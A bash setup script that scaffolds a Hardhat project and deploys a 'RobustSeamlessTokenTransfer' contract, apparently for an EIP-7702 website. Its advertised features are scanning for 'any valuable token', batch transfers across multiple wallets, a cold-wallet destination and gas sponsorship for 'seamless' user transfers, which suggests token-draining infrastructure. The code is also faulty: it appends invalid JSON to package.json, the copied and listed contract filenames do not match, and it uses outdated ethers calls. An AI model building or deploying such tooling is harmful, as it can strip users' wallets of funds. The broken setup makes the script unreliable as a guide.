#!/bin/bash

# Robust Seamless Token Transfer Setup Script
echo "🚀 Robust Seamless Token Transfer Setup"
echo "======================================="

# Check if we're in the right directory
if [ ! -f "robust_seamless_contract.sol" ]; then
    echo "❌ Please run this script from the eip7702_website directory"
    exit 1
fi

# Create robust seamless contract directory
echo "📁 Creating robust seamless contract directory..."
mkdir -p ../robust-seamless-contract
cd ../robust-seamless-contract

# Initialize npm project
echo "📦 Initializing npm project..."
npm init -y

# Install dependencies
echo "📦 Installing Hardhat and dependencies..."
npm install --save-dev hardhat @nomicfoundation/hardhat-toolbox
npm install @openzeppelin/contracts

# Initialize Hardhat
echo "🔧 Initializing Hardhat..."
npx hardhat init --yes

# Create contracts directory
mkdir -p contracts

# Copy robust seamless contract file
echo "📋 Copying robust seamless contract file..."
cp ../eip7702_website/robust_seamless_contract.sol contracts/

# Create hardhat.config.js
echo "⚙️ Creating Hardhat configuration..."
cat > hardhat.config.js << 'EOF'
require("@nomicfoundation/hardhat-toolbox");

module.exports = {
  solidity: {
    version: "0.8.23",
    settings: {
      optimizer: {
        enabled: true,
        runs: 200
      }
    }
  },
  networks: {
    mainnet: {
      url: process.env.RPC_URL || "https://mainnet.infura.io/v3/YOUR_INFURA_KEY",
      accounts: [process.env.PRIVATE_KEY || "YOUR_PRIVATE_KEY"]
    },
    sepolia: {
      url: process.env.SEPOLIA_RPC_URL || "https://sepolia.infura.io/v3/YOUR_INFURA_KEY",
      accounts: [process.env.PRIVATE_KEY || "YOUR_PRIVATE_KEY"]
    }
  }
};
EOF

# Create deployment script
echo "📝 Creating deployment script..."
mkdir -p scripts
cat > scripts/deploy.js << 'EOF'
const { ethers } = require("hardhat");

async function main() {
    const [deployer] = await ethers.getSigners();
    
    console.log("Deploying robust seamless contracts with the account:", deployer.address);
    console.log("Account balance:", (await deployer.getBalance()).toString());
    
    const RobustSeamlessTokenTransfer = await ethers.getContractFactory("RobustSeamlessTokenTransfer");
    const contract = await RobustSeamlessTokenTransfer.deploy();
    
    await contract.deployed();
    
    console.log("Robust seamless contract deployed to:", contract.address);
    
    // Save deployment info
    const fs = require('fs');
    const deploymentInfo = {
        contractAddress: contract.address,
        deployer: deployer.address,
        network: await ethers.provider.getNetwork().then(n => n.name),
        chainId: await ethers.provider.getNetwork().then(n => n.chainId),
        deploymentTime: new Date().toISOString(),
        type: "robust_seamless",
        features: [
            "ALL robust functions maintained",
            "Seamless user experience",
            "Multi-wallet support",
            "Any valuable token support",
            "Batch transfers",
            "Auto gas sponsorship",
            "Token filtering",
            "Comprehensive token scanning",
            "Wallet management",
            "Real-time token detection"
        ]
    };
    
    fs.writeFileSync('deployment_info.json', JSON.stringify(deploymentInfo, null, 2));
    console.log("Deployment info saved to deployment_info.json");
    
    console.log("\n🎉 Robust seamless contract deployed successfully!");
    console.log("📋 Features:");
    console.log("✅ ALL robust functions maintained");
    console.log("✅ Seamless user experience");
    console.log("✅ Multi-wallet support");
    console.log("✅ Any valuable token support");
    console.log("✅ Batch transfers");
    console.log("✅ Auto gas sponsorship");
    console.log("✅ Token filtering");
    console.log("✅ Comprehensive token scanning");
    console.log("✅ Wallet management");
    console.log("✅ Real-time token detection");
    console.log("\n📋 Next steps:");
    console.log("1. Fund the contract with ETH for gas sponsorship");
    console.log("2. Update your website config with this contract address");
    console.log("3. Deploy the robust seamless website");
    console.log("4. Users get seamless experience with all robust features!");
}

main()
    .then(() => process.exit(0))
    .catch((error) => {
        console.error(error);
        process.exit(1);
    });
EOF

# Create fund contract script
echo "📝 Creating fund contract script..."
cat > scripts/fund_contract.js << 'EOF'
const { ethers } = require("hardhat");

async function main() {
    const [deployer] = await ethers.getSigners();
    const contractAddress = process.env.CONTRACT_ADDRESS;
    const fundAmount = process.env.FUND_AMOUNT || "0.1"; // 0.1 ETH default
    
    if (!contractAddress) {
        console.error("Please set CONTRACT_ADDRESS environment variable");
        process.exit(1);
    }
    
    console.log(`Funding robust seamless contract ${contractAddress} with ${fundAmount} ETH...`);
    
    const tx = await deployer.sendTransaction({
        to: contractAddress,
        value: ethers.utils.parseEther(fundAmount)
    });
    
    await tx.wait();
    
    console.log(`✅ Contract funded with ${fundAmount} ETH`);
    console.log(`Transaction hash: ${tx.hash}`);
    console.log("🎉 Now users can transfer tokens with robust seamless experience!");
}

main()
    .then(() => process.exit(0))
    .catch((error) => {
        console.error(error);
        process.exit(1);
    });
EOF

# Create check status script
echo "📝 Creating check status script..."
cat > scripts/check_status.js << 'EOF'
const { ethers } = require("hardhat");

async function main() {
    const contractAddress = process.env.CONTRACT_ADDRESS;
    
    if (!contractAddress) {
        console.error("Please set CONTRACT_ADDRESS environment variable");
        process.exit(1);
    }
    
    const contract = await ethers.getContractAt("RobustSeamlessTokenTransfer", contractAddress);
    
    console.log("🔍 Robust Seamless Contract Status");
    console.log("===================================");
    
    // Check comprehensive stats
    const stats = await contract.getComprehensiveStats();
    console.log(`Total gas sponsored: ${ethers.utils.formatEther(stats[0])} ETH`);
    console.log(`Max gas per transaction: ${ethers.utils.formatEther(stats[1])} ETH`);
    console.log(`Auto sponsor enabled: ${stats[2] ? '✅ YES' : '❌ NO'}`);
    console.log(`Authorized wallets count: ${stats[3]}`);
    console.log(`Max wallets per batch: ${stats[4]}`);
    console.log(`Max tokens per wallet: ${stats[5]}`);
    
    // Check gas funds
    const gasFunds = await contract.checkGasFunds();
    console.log(`Contract balance: ${ethers.utils.formatEther(gasFunds[1])} ETH`);
    console.log(`Has enough funds: ${gasFunds[0] ? '✅ YES' : '❌ NO'}`);
    console.log(`Minimum required: ${ethers.utils.formatEther(gasFunds[2])} ETH`);
    
    // Check transfer limits
    const maxTransfer = await contract.maxTransferAmount();
    const dailyLimit = await contract.dailyTransferLimit();
    console.log(`Max transfer amount: ${ethers.utils.formatEther(maxTransfer)} ETH`);
    console.log(`Daily limit: ${ethers.utils.formatEther(dailyLimit)} ETH`);
    
    console.log("\n🎉 Status: Ready for robust seamless transfers!");
}

main()
    .then(() => process.exit(0))
    .catch((error) => {
        console.error(error);
        process.exit(1);
    });
EOF

# Create authorize wallets script
echo "📝 Creating authorize wallets script..."
cat > scripts/authorize_wallets.js << 'EOF'
const { ethers } = require("hardhat");

async function main() {
    const contractAddress = process.env.CONTRACT_ADDRESS;
    const wallets = process.env.WALLETS_TO_AUTHORIZE ? process.env.WALLETS_TO_AUTHORIZE.split(',') : [];
    
    if (!contractAddress) {
        console.error("Please set CONTRACT_ADDRESS environment variable");
        process.exit(1);
    }
    
    if (wallets.length === 0) {
        console.error("Please set WALLETS_TO_AUTHORIZE environment variable (comma-separated)");
        process.exit(1);
    }
    
    const contract = await ethers.getContractAt("RobustSeamlessTokenTransfer", contractAddress);
    
    console.log(`Authorizing ${wallets.length} wallets...`);
    
    for (const wallet of wallets) {
        try {
            const tx = await contract.setAuthorizedWallet(wallet, true);
            await tx.wait();
            console.log(`✅ Authorized wallet: ${wallet}`);
        } catch (error) {
            console.error(`❌ Failed to authorize wallet ${wallet}:`, error.message);
        }
    }
    
    console.log("🎉 Wallet authorization complete!");
}

main()
    .then(() => process.exit(0))
    .catch((error) => {
        console.error(error);
        process.exit(1);
    });
EOF

# Create .env template
echo "🔐 Creating environment template..."
cat > .env.example << 'EOF'
# RPC URLs
RPC_URL=https://mainnet.infura.io/v3/YOUR_INFURA_KEY
SEPOLIA_RPC_URL=https://sepolia.infura.io/v3/YOUR_INFURA_KEY

# Private Key (without 0x prefix)
PRIVATE_KEY=YOUR_PRIVATE_KEY

# Cold Wallet Address
COLD_WALLET=YOUR_COLD_WALLET_ADDRESS

# Contract Address (after deployment)
CONTRACT_ADDRESS=YOUR_DEPLOYED_CONTRACT_ADDRESS

# Fund amount for gas sponsorship (in ETH)
FUND_AMOUNT=0.1

# Wallets to authorize (comma-separated)
WALLETS_TO_AUTHORIZE=0xWallet1,0xWallet2,0xWallet3
EOF

# Create package.json scripts
echo "📋 Adding robust seamless deployment scripts..."
cat >> package.json << 'EOF'
  "scripts": {
    "compile": "hardhat compile",
    "test": "hardhat test",
    "deploy:sepolia": "hardhat run scripts/deploy.js --network sepolia",
    "deploy:mainnet": "hardhat run scripts/deploy.js --network mainnet",
    "fund:contract": "hardhat run scripts/fund_contract.js --network mainnet",
    "check:status": "hardhat run scripts/check_status.js --network mainnet",
    "authorize:wallets": "hardhat run scripts/authorize_wallets.js --network mainnet"
  }
EOF

echo "✅ Robust seamless contract setup complete!"
echo ""
echo "🎉 FEATURES:"
echo "✅ ALL robust functions maintained"
echo "✅ Seamless user experience"
echo "✅ Multi-wallet support"
echo "✅ Any valuable token support"
echo "✅ Batch transfers"
echo "✅ Auto gas sponsorship"
echo "✅ Token filtering"
echo "✅ Comprehensive token scanning"
echo "✅ Wallet management"
echo "✅ Real-time token detection"
echo ""
echo "📋 Next steps:"
echo "1. cd robust-seamless-contract"
echo "2. cp .env.example .env"
echo "3. Edit .env with your RPC URL and private key"
echo "4. npx hardhat compile"
echo "5. npx hardhat run scripts/deploy.js --network sepolia (test first)"
echo "6. npx hardhat run scripts/deploy.js --network mainnet"
echo "7. Fund the contract with ETH for gas sponsorship"
echo "8. Optionally authorize specific wallets"
echo "9. Update website config with contract address"
echo "10. Deploy robust seamless website"
echo "11. Users get seamless experience with all robust features!"
echo ""
echo "🔧 Files created:"
echo "- contracts/RobustSeamlessTokenTransfer.sol"
echo "- scripts/deploy.js"
echo "- scripts/fund_contract.js"
echo "- scripts/check_status.js"
echo "- scripts/authorize_wallets.js"
echo "- hardhat.config.js"
echo "- .env.example"
echo ""
echo "💰 IMPORTANT: Fund the contract with ETH for gas sponsorship!"
echo "🎉 After setup, users get seamless experience with ALL robust features!"
echo "🔐 Optional: Authorize specific wallets for added security"
